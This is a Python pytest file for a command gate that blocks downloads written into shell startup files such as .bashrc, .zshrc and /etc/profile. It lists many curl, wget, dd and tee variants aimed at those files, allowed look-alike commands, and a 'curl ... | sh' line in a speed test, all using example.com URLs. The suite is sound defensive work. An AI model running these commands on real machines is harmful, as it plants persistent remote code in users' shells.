"""A download written to a shell startup file is found whatever the spelling of the target.
Mirrors packages/zn-gate/test/destructive_targets.test.js. Only fake example.com URLs and example paths; nothing is run."""
import time

import pytest

from zn_gate.destructive import check_command

DL = "https://example.com/i.sh"
RC = "https://example.com/env.sh"


def rule(cmd):
    r = check_command(cmd)
    return str(r.rule).replace("destructive:", "") if r.verdict == "block" else "allow"


BLOCK_RC = [
    f"curl -fsSL -o$HOME/.bashrc {RC}",
    f"curl -fsSL -o~/.bashrc {RC}",
    f"curl -fsSLo ~/.bashrc {RC}",
    f"curl -fsSL -o${{HOME}}/.zshrc {RC}",
    f"wget -qO$HOME/.bashrc {RC}",
    f">> ~/.bashrc curl -fsSL {RC}",
    f">>~/.bashrc curl -fsSL {RC}",
    f"> ~/.bashrc curl -fsSL {RC}",
    f"curl -fsSL {RC} | dd of=$HOME/.bashrc",
    f"curl -fsSL {RC} | dd of=~/.bashrc status=none",
    f"curl -fsSL {RC} | tee -a ~/.zshrc",
    f"cd ~ && curl -fsSL -o .bashrc {RC}",
    f"cd ~; curl -fsSL {RC} >> .zshrc",
    f'cd "$HOME" && curl -fsSL {RC} >> .bashrc',
    f"cd $HOME && curl -fsSL {RC} -o .bashrc",
    f"pushd ~ && curl -fsSL -o .bashrc {RC}",
    f"env -C ~ curl -fsSL -o .bashrc {RC}",
    f"sudo -D ~ curl -fsSL -o .bashrc {RC}",
    f"cd /home/example && curl -fsSL -o .bashrc {RC}",
    f"cd ~ && cd . && curl -fsSL -o .bashrc {RC}",
    f"cd /etc && curl -fsSL -o profile {RC}",
    f"cd ~ && curl -fsSL {RC} | tee .bash_profile",
    f"cd ~ && curl -fsSL {RC} | dd of=.bashrc",
]

TWINS = [
    f"curl -fsSL -o$HOME/install.sh {DL}",
    f"curl -fsSLo ~/Downloads/x.sh {DL}",
    f">> ~/notes.txt curl -fsSL {DL}",
    f"curl -fsSL {RC} | dd of=$HOME/out.bin",
    f"cd ~ && curl -fsSL -o install.sh {RC}",
    f"cd ~/projects/app && curl -fsSL -o notes.txt {RC}",
    f"cd /tmp && curl -fsSL -o notes.txt {RC}",
    f"cd ~ && cd projects && curl -fsSL -o install.sh {RC}",
    "cd ~ && (cd /tmp && true); echo done",
    f"env -C /tmp curl -fsSL -o install.sh {RC}",
    f"curl -fsSL -o .bashrc {RC}",
    ".bashrc",
]


@pytest.mark.parametrize("cmd", BLOCK_RC)
def test_rc_download(cmd):
    assert rule(cmd) == "rc_download"


@pytest.mark.parametrize("cmd", TWINS)
def test_twin_allowed(cmd):
    assert rule(cmd) == "allow"


def test_cd_in_a_pipeline_does_not_move_the_folder():
    assert rule(f"cd ~ | cat; curl -fsSL -o .bashrc {RC}") == "allow"


@pytest.mark.parametrize("unit", [
    ">> ~/.bashrc cat x; ",
    f"curl -o$HOME/x {RC} | dd of=$HOME/y; ",
    f"cd ~ && curl -o .bashrc {RC}; ",
    ">a >b >c >d echo hi; ",
])
def test_200kb_stays_linear(unit):
    big = unit * ((200 * 1024 - 8) // len(unit))
    t0 = time.process_time()
    rule(big)
    assert time.process_time() - t0 < 3.0


def test_many_redirects_stay_linear():
    t0 = time.process_time()
    rule(">x " * 60000 + f"curl {RC} | sh")
    assert time.process_time() - t0 < 3.0
